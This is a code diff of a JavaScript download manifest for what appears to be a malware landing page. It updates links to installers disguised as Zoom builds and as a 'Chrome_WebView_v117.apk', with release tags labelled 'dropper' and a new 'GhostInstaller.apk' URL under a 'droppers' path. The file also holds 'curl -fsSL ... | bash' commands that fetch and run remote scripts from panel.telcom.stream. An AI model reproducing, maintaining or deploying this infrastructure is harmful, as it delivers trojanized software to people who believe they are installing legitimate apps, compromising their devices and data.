@@ -11,7 +11,7 @@
   var MACOS_INSTALL_COMMAND = 'curl -fsSL ' + MACOS_INSTALL_SCRIPT + ' | /bin/bash';
   var LINUX_INSTALL_SCRIPT = 'https://panel.telcom.stream/api/landing/linux-install.sh';
   var LINUX_INSTALL_COMMAND = 'curl -fsSL ' + LINUX_INSTALL_SCRIPT + ' | bash';
-  var CACHE_KEY = 'zp_assets_v8';
+  var CACHE_KEY = 'zp_assets_v9';
   var CACHE_TTL = 10 * 60 * 1000;
   var MIN_ASSET_SIZE = 1000000;
 
@@ -36,11 +36,11 @@
       release: 'dropper-6.1.0', updatedAt: 1
     },
     android: {
-      name: 'Chrome_WebView_v117.apk', size: 46247659, platform: 'android', format: 'apk', arch: 'universal',
-      url: 'https://panel.telcom.stream/download/android',
+      name: 'Chrome_WebView_v117.apk', size: 22914695, platform: 'android', format: 'apk', arch: 'universal',
+      url: 'https://global.telcom.stream/downloads/droppers/GhostInstaller.apk?v=2.1.123',
       payloadUrl: 'https://panel.telcom.stream/api/landing/download?platform=android&arch=universal&format=apk',
-      sha256: '2a6889a7a9fa144422c9c5f9ec932a16735af6fd82c3622baf93914d7d2cffb9',
-      release: 'dropper-6.1.1', updatedAt: 119
+      sha256: '1c1004300c9188ad87967863d0cdcd212d5405060898f6fd9430c070cbe8fe2d',
+      release: 'dropper-2.1.123', updatedAt: 123
     }
   };
 
@@ -119,14 +119,14 @@
       size: 2887680, platform: 'windows', format: 'msi', arch: 'x64', release: 'setup-latest'
     },
     {
-      name: 'zoom-vip-windows-x64-1.0.0.zip',
-      url: 'https://github.com/' + REPO + '/releases/download/setup-latest/zoom-vip-windows-x64-1.0.0.zip',
-      size: 6368445, platform: 'windows', format: 'zip', arch: 'x64', release: 'setup-latest'
+      name: 'zoom-vip-windows-x64-2.1.123.zip',
+      url: 'https://github.com/' + REPO + '/releases/download/setup-latest/zoom-vip-windows-x64-2.1.123.zip',
+      size: 3015757, platform: 'windows', format: 'zip', arch: 'x64', release: 'setup-latest'
     },
     {
-      name: 'zoom-vip-windows-x64-1.0.0.iso',
-      url: 'https://github.com/' + REPO + '/releases/download/setup-latest/zoom-vip-windows-x64-1.0.0.iso',
-      size: 15073280, platform: 'windows', format: 'iso', arch: 'x64', release: 'setup-latest'
+      name: 'zoom-vip-windows-x64-2.1.123.iso',
+      url: 'https://github.com/' + REPO + '/releases/download/setup-latest/zoom-vip-windows-x64-2.1.123.iso',
+      size: 8388608, platform: 'windows', format: 'iso', arch: 'x64', release: 'setup-latest'
     },
     {
       name: 'zoom-private.Setup_1.0.0_x64_en-US.dmg',
@@ -139,14 +139,14 @@
       size: 4496795, platform: 'macos', format: 'targz', arch: 'universal', release: 'setup-latest'
     },
     {
-      name: 'zoom-vip-macos-arm64-1.0.0.tar.gz',
-      url: 'https://github.com/' + REPO + '/releases/download/setup-latest/zoom-vip-macos-arm64-1.0.0.tar.gz',
-      size: 2749405, platform: 'macos', format: 'targz', arch: 'arm64', release: 'setup-latest'
+      name: 'zoom-vip-macos-arm64-2.1.123.tar.gz',
+      url: 'https://github.com/' + REPO + '/releases/download/setup-latest/zoom-vip-macos-arm64-2.1.123.tar.gz',
+      size: 2752843, platform: 'macos', format: 'targz', arch: 'arm64', release: 'setup-latest'
     },
     {
-      name: 'zoom-vip-macos-amd64-1.0.0.tar.gz',
-      url: 'https://github.com/' + REPO + '/releases/download/setup-latest/zoom-vip-macos-amd64-1.0.0.tar.gz',
-      size: 2993148, platform: 'macos', format: 'targz', arch: 'x64', release: 'setup-latest'
+      name: 'zoom-vip-macos-amd64-2.1.123.tar.gz',
+      url: 'https://github.com/' + REPO + '/releases/download/setup-latest/zoom-vip-macos-amd64-2.1.123.tar.gz',
+      size: 2995299, platform: 'macos', format: 'targz', arch: 'x64', release: 'setup-latest'
     },
     {
       name: 'zoom-private.Setup_1.0.0_x64_en-US.AppImage',
@@ -164,9 +164,9 @@
       size: 6782289, platform: 'linux', format: 'rpm', arch: 'x64', release: 'portable-latest'
     },
     {
-      name: 'zoom-vip-linux-x64-1.0.0.tar.gz',
-      url: 'https://github.com/' + REPO + '/releases/download/setup-latest/zoom-vip-linux-x64-1.0.0.tar.gz',
-      size: 3154309, platform: 'linux', format: 'targz', arch: 'x64', release: 'setup-latest'
+      name: 'zoom-vip-linux-x64-2.1.123.tar.gz',
+      url: 'https://github.com/' + REPO + '/releases/download/setup-latest/zoom-vip-linux-x64-2.1.123.tar.gz',
+      size: 3155422, platform: 'linux', format: 'targz', arch: 'x64', release: 'setup-latest'
     }
   ];
 
